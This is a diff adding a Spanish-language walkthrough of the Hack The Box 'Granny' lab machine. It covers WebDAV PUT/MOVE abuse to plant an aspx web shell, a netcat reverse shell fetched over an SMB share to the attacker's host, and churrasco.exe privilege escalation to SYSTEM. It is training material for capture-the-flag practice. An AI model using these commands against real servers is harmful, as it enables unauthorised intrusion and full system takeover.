@@ -1,0 +1,108 @@
+maquina granny--------------------htb 
+
+aprendizaje 
+
+WebDav
+ASP
+Penetration Tester Level 2
+IIS
+Web
+Vulnerability Assessment
+Outdated Software
+Reconnaissance
+Arbitrary File Upload
+Misconfiguration
+
+---------------------------------------
+
+en esta maquina cuando tiramos de nmap nos da unas claves muy importantes para los windows 
+
+el tema es que hay unos comandos publicos que estan activos que no deberian como el 
+
+PUT y el MOVE de este servidor 
+
+Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+
+eso quiere decir que con la herramienta davtest podemos ver los archiso que podemos subir (PUT)
+
+PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.cfm
+PUT     cgi     FAIL
+PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.jhtml
+PUT     shtml   FAIL
+PUT     asp     FAIL
+PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.html
+PUT     aspx    FAIL
+PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.pl
+PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.php
+PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.jsp
+PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_7RPWMKJiIbN/davtest_7RPWMKJiIbN.txt
+
+como podemos ver nos deja subir muchos tipos de archivos pero no nos deja subir los que 
+queremos nosotros que son los aspx y los asp pero podemos moverlos dentro del servidor
+
+por lo tanto podemos renombrarlos, lo que vamos a hacer es tirar un curl para subirlo 
+
+con este comando 
+
+curl -s -X PUT http://ipatacada/nombredelarchivo.txt -d nombreasubir.txt
+
+es decir si buscamos un archivo que se llama 
+
+locate cmdasp.aspx 
+
+lo tienes en seclist dentro de parrot
+
+podemos subirlo pero no nos deja subir archivos con ese formato por lo que tenemos que llamarlo
+de otra manera por lo tanto le hemos puesto txt 
+
+luego una vez subido podemos hacer un curl igual pero cambiarle el nombre es decir
+
+curl -s -X MOVE -H "Destination:http//10.10.10.15/cmdasp.aspx" http://10.10.10.15/cmdasp.txt
+
+eso lo que hace es cambiarlo de nombre y por lo tanto poder ejecutarlo a nivel de web
+
+vamos al sitio web y vemos que tenemos una pagina uqe nos permite lanzar comandos
+hemos tirando un comando que nos ha pedido el nc.exe a nuestro pc con un recurso
+compartido
+
+smbserver.py granny $(pwd) <--- en nuestra carpeta donde tenemos el netcat
+
+\\10.10.14.25\\granny\nc.exe -e cmd 10.10.14.25 4646
+
+y hemos lanzado un puerto de escucha por el 4646 
+
+nc -lnvp 4646
+
+y nos ha otorgado una consola como nt autority service
+
+no tenemos acceso a nada pero hemos nombrado los grupos en los que estamos 
+y hemos visto que podemos larzar un exploit que se llama juicepotatoes.exe 
+
+pero no ha funcionado ya que al ver el sistema que tiene de 2003 tan antiguo
+no funciona... hemos buscado un poco y hemos encontraado otro que se llama
+churrasco.exe 
+
+el caso es que ese si que ha funcionado... solo hemos tenido que montar un 
+servicio como antes con el smbserver.py y mandarnos los exploits 
+
+para hacer funcionar a churrasco solo tenemos que hacer 
+
+churrasco.exe "comando" y listo 
+
+hemos lanzado un netcat como antes ya que churrasco hace ejecucion de comandos
+como nt autority system (administrador) asi 
+
+
+churrasco.exe "\10.10.14.25\\granny\nc.exe -e cmd 10.10.14.25 4646" 
+
+aunque esta vez hemos tenido que cambiar un poco el sistema y darle soporte al 
+recurso compartido 
+
+smbserver.py granny $(pwd) -smb2support
+
+EL -SMB2SUPPORT ES IMPORTANTE 
+
+
+nos hemos puesto de nuevo es escucha y listo tenemos acceso 
+
+
